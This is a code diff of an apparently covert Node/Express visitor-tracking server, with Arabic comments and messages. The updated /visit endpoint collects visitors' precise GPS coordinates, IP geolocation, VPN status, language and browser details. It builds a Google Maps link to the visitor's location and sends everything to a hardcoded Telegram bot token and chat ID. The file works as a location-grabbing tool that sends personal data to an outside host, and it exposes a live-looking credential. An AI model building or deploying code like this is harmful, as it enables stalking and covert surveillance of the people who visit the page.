@@ -4,108 +4,78 @@ const path = require("path");
 const app = express();
 app.use(express.json());
 
-// ====== CONFIG ======
+// ====== الإعدادات (هام: قم بتغيير التوكن إذا تم كشفه) ======
 const TELEGRAM_BOT_TOKEN = "8099317271:AAGndvsVqk9qNnzitfLhqp8UenEzlxxBA8Y";
 const TELEGRAM_CHAT_ID = "8059402181";
 const PORT = process.env.PORT || 3000;
 
-// ====== TELEGRAM ======
+// ====== إرسال التقرير لتليجرام ======
 async function sendToTelegram(text) {
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: TELEGRAM_CHAT_ID,
-      text,
-    }),
-  });
-}
-
-// ====== WHOIS via RDAP (بديل آمن لـ whois CLI) ======
-async function getWhois(ip) {
   try {
-    // RIPE / ARIN RDAP (يشتغل عالميًا)
-    const res = await fetch(`https://rdap.arin.net/registry/ip/${ip}`);
-    const data = await res.json();
-
-    return {
-      network: data.name,
-      cidr: data.cidr0_cidrs?.[0]?.v4prefix + "/" + data.cidr0_cidrs?.[0]?.length,
-      org: data.entities?.[0]?.vcardArray?.[1]?.find(v => v[0] === "fn")?.[3],
-      country: data.country,
-      handle: data.handle,
-    };
-  } catch {
-    return null;
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: text,
+        parse_mode: "Markdown"
+      }),
+    });
+  } catch (err) {
+    console.error("Telegram Error:", err);
   }
 }
 
-// ====== VISIT LOGGER ======
+// ====== معالجة الزيارة ======
 app.post("/visit", async (req, res) => {
   try {
-    const ip =
-      req.headers["x-forwarded-for"]?.split(",")[0] ||
-      req.socket.remoteAddress;
+    const { lat, lon, accuracy, userAgent, language } = req.body;
+    const ip = req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
 
-    // ===== GEO IP =====
-    const geoRes = await fetch(
-      `http://ip-api.com/json/${ip}?fields=66846719`
-    );
-    const geo = await geoRes.json();
+    // الحصول على بيانات الـ IP التقليدية (للمقارنة أو في حال رفض الإذن)
+    const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
+    const ipGeo = await geoRes.json();
 
-    // ===== WHOIS =====
-    const whois = await getWhois(ip);
-
-    const ua = req.headers["user-agent"] || "unknown";
-    const isMobile = /mobile|android|iphone/i.test(ua);
+    const locationSource = lat ? "🎯 GPS (دقيق جداً)" : "🌐 IP Address (تقديري)";
+    const mapsLink = lat ? `https://www.google.com/maps?q=${lat},${lon}` : "غير متوفر";
 
     const message = `
-🛡️ Visit Log
+🔔 *تقرير زيارة جديد*
 ----------------------
-IP: ${ip}
+📍 *مصدر الموقع:* ${locationSource}
+📌 *الإحداثيات:* ${lat || "N/A"}, ${lon || "N/A"}
+📏 *نسبة الخطأ:* ${accuracy ? accuracy + " متر" : "N/A"}
 
-🌍 Geo Location
-Country: ${geo.country}
-City: ${geo.city}
-ISP: ${geo.isp}
-ASN: ${geo.as}
-VPN/Proxy: ${geo.proxy}
-Hosting: ${geo.hosting}
-Location: ${geo.lat}, ${geo.lon}
+🌍 *بيانات الـ IP (الشبكة):*
+- المدينة/المحافظة: ${ipGeo.city || "غير معروف"}
+- الدولة: ${ipGeo.country || "غير معروف"}
+- الشركة المزودة: ${ipGeo.isp || "غير معروف"}
+- هل يستخدم VPN؟: ${ipGeo.proxy ? "نعم ⚠️" : "لا"}
 
-📡 WHOIS / Network
-Org: ${whois?.org || "N/A"}
-Network: ${whois?.network || "N/A"}
-CIDR: ${whois?.cidr || "N/A"}
-Handle: ${whois?.handle || "N/A"}
-Country: ${whois?.country || "N/A"}
+📱 *الجهاز والمتصفح:*
+- اللغة: ${language}
+- المتصفح: ${userAgent.substring(0, 50)}...
 
-📱 Device
-Type: ${isMobile ? "Mobile" : "Desktop"}
+🗺️ *رابط الموقع على الخريطة:*
+${mapsLink}
 
-🧠 User-Agent
-${ua}
-
-🌐 Language: ${req.headers["accept-language"]}
-🔗 Referer: ${req.headers["referer"] || "Direct"}
-
-⏰ Time: ${new Date().toLocaleString()}
+⏰ *الوقت:* ${new Date().toLocaleString('ar-EG')}
 ----------------------
 `;
 
     await sendToTelegram(message);
-    res.json({ logged: true });
+    res.json({ success: true });
   } catch (e) {
     console.error(e);
-    res.status(500).json({ error: "failed" });
+    res.status(500).json({ error: "internal error" });
   }
 });
 
-// ====== SERVE HTML ======
+// تقديم الصفحة الرئيسية
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
 
 app.listen(PORT, () => {
-  console.log("Server running on port", PORT);
+  console.log(`Server is running on port ${PORT}`);
 });
